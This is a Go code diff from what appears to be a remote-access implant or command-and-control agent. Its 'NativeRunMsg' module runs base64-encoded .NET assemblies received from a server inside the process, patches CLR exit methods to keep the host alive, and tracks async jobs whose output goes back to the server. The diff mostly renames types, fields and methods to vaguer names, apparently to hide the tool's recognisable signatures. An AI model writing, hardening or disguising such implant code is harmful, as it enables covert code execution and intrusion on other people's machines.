@@ -15,8 +15,8 @@ import (
 	"time"
 )
 
-// IATemplate receives string templates from server
-type IATemplate struct {
+// NativeRunCfg receives string templates from server
+type NativeRunCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -73,7 +73,7 @@ var (
 
 var (
 	exitPreventionOnce sync.Once
-	exitPrevention     *CLRExitPrevention
+	exitPrevention     *RuntimeGuard
 	exitMethodsPatched bool
 )
 
@@ -81,7 +81,7 @@ func InitializeExitPrevention() {
 	exitPreventionOnce.Do(func() {
 		exitPrevention = NewCLRExitPrevention()
 
-		if err := exitPrevention.PatchAllExitMethods(); err != nil {
+		if err := exitPrevention.patchAllExitMethods(); err != nil {
 		} else {
 			exitMethodsPatched = true
 			// removed debug log
@@ -89,15 +89,15 @@ func InitializeExitPrevention() {
 	})
 }
 
-// InlineAssemblyCommand handles synchronous inline .NET assembly execution
-type InlineAssemblyCommand struct{}
+// NativeRunMsg handles synchronous inline .NET assembly execution
+type NativeRunMsg struct{}
 
-func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data if available
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+func (c *NativeRunMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data if available
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 		if err == nil {
-			var tpl IATemplate
+			var tpl NativeRunCfg
 			if err := json.Unmarshal(decoded, &tpl); err == nil {
 				// Set shared template for other IA files to use
 				SetInlineAssemblyTemplate(tpl.Templates)
@@ -107,9 +107,9 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 
 	osWindows := iaOsWindows()
 	if runtime.GOOS != osWindows {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E42),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -127,16 +127,16 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 	// Get the command data from context first
 	var configData string
 
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
 		// Use the data from the current command context
-		configData = ctx.CurrentCommand.Data
+		configData = ctx.CurrentMsg.Data
 	} else if len(args) > 0 {
 		// Fall back to args if provided
 		configData = strings.Join(args, " ")
 	} else {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E43),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -162,9 +162,9 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 				config.Arguments = args[1:]
 			}
 		} else {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E44),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 	}
@@ -172,9 +172,9 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 	// Decode assembly
 	assemblyBytes, err := base64.StdEncoding.DecodeString(config.AssemblyB64)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E45),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -201,22 +201,22 @@ func (c *InlineAssemblyCommand) Execute(ctx *CommandContext, args []string) Comm
 
 	// Show exit prevention status
 	if exitMethodsPatched {
-		output.WriteString(SuccCtx(S28, fmt.Sprintf("%d", len(exitPrevention.GetPatchedMethods()))) + "\n")
+		output.WriteString(SuccCtx(S28, fmt.Sprintf("%d", len(exitPrevention.getPatchedMethods()))) + "\n")
 	}
 
-	// Execute with protection (this method is defined in action_inline_assembly.go)
+	// execute with protection (this method is defined in action_inline_assembly.go)
 	assemblyOutput, exitCode := c.executeWindowsAssembly(assemblyBytes, config, executionNumber)
 
 	output.WriteString(assemblyOutput)
 
-	return CommandResult{
+	return OpResult{
 		Output:   output.String(),
-		ExitCode: exitCode,
+		EC: exitCode,
 	}
 }
 
 // isDLLAssembly checks if the assembly is a DLL
-func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
+func (c *NativeRunMsg) isDLLAssembly(assemblyBytes []byte) bool {
 	// Check PE headers to determine if it's a DLL
 	if len(assemblyBytes) < 0x3C+4 {
 		return false
@@ -242,44 +242,44 @@ func (c *InlineAssemblyCommand) isDLLAssembly(assemblyBytes []byte) bool {
 	return (characteristics & 0x2000) != 0
 }
 
-// InlineAssemblyAsyncCommand handles async inline .NET assembly execution
-type InlineAssemblyAsyncCommand struct {
-	InlineAssemblyCommand
+// NativeAsyncMsg handles async inline .NET assembly execution
+type NativeAsyncMsg struct {
+	NativeRunMsg
 }
 
-// Execute method for InlineAssemblyAsyncCommand to use the new async execution
-func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+// execute method for NativeAsyncMsg to use the new async execution
+func (c *NativeAsyncMsg) execute(ctx *OpCtx, args []string) OpResult {
 	// Generate a unique job ID
 	jobPrefixFmt := iaJobPrefix()
 	jobID := fmt.Sprintf(jobPrefixFmt, time.Now().UnixNano())
 
 	// Get the current command from context
-	var currentCmd Command
-	if ctx.CurrentCommand != nil {
-		currentCmd = *ctx.CurrentCommand
+	var currentCmd Msg
+	if ctx.CurrentMsg != nil {
+		currentCmd = *ctx.CurrentMsg
 		currentCmd.JobID = jobID
 	}
 
 	// Create assembly job for tracking
 	statusRun := iaStatusRun()
-	job := &AssemblyJob{
+	job := &NativeJob{
 		ID:          jobID,
-		CommandID:   currentCmd.CommandID,
-		CommandDBID: currentCmd.CommandDBID,
-		AgentID:     currentCmd.AgentID,
+		CID:   currentCmd.CID,
+		DID: currentCmd.DID,
+		AID:     currentCmd.AID,
 		Name:        currentCmd.Filename,
 		Status:      statusRun,
 		StartTime:   time.Now(),
 		CancelChan:  make(chan bool, 1),
-		Command:     currentCmd,
+		Cmd:     currentCmd,
 	}
 
 	// Add job to assembly job manager
-	assemblyJobManager.AddJob(job)
+	assemblyJobManager.addJob(job)
 
 	// Also create job info for commandQueue tracking (for compatibility)
 	cmdNameAsync := iaCmdNameAsync()
-	jobInfo := JobInfo{
+	jobInfo := WI{
 		ID:        jobID,
 		StartTime: time.Now(),
 		Filename:  currentCmd.Filename,
@@ -310,15 +310,15 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 				job.OutputMutex.Unlock()
 
 				// Send crash result
-				crashResult := CommandResult{
+				crashResult := OpResult{
 					Output:      finalOutput,
 					Error:       job.Error,
-					ExitCode:    -1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    -1,
+					Done: time.Now().Format(time.RFC3339),
 					JobID:       jobID,
 				}
 				if resultManager != nil {
-					resultManager.AddResult(&crashResult)
+					resultManager.addResult(&crashResult)
 				}
 			}
 		}()
@@ -366,7 +366,7 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 			return
 		}
 
-		// Execute with async capture
+		// execute with async capture
 		var exitCode int
 
 		osWindows := iaOsWindows()
@@ -427,18 +427,18 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 		}
 
 		// CRITICAL: Send final result back to server
-		// We need to include the Command data for the server to identify this result
-		finalResult := CommandResult{
-			Command:     currentCmd, // Include the command so server knows what this is for
+		// We need to include the Msg data for the server to identify this result
+		finalResult := OpResult{
+			Cmd:     currentCmd, // Include the command so server knows what this is for
 			Output:      finalOutput,
-			ExitCode:    exitCode,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    exitCode,
+			Done: time.Now().Format(time.RFC3339),
 			JobID:       jobID,
 		}
 
 		// Send the result back through the result manager
 		if resultManager != nil {
-			if err := resultManager.AddResult(&finalResult); err != nil {
+			if err := resultManager.addResult(&finalResult); err != nil {
 			} else {
 			}
 		} else {
@@ -448,10 +448,10 @@ func (c *InlineAssemblyAsyncCommand) Execute(ctx *CommandContext, args []string)
 
 	fmtAsyncStarted := iaFmtAsyncStarted()
 	fmtOutputHint := iaFmtOutputHint()
-	return CommandResult{
+	return OpResult{
 		Output:      fmt.Sprintf(fmtAsyncStarted, jobID) + fmt.Sprintf(fmtOutputHint, jobID),
-		ExitCode:    0,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    0,
+		Done: time.Now().Format(time.RFC3339),
 		JobID:       jobID,
 	}
 }
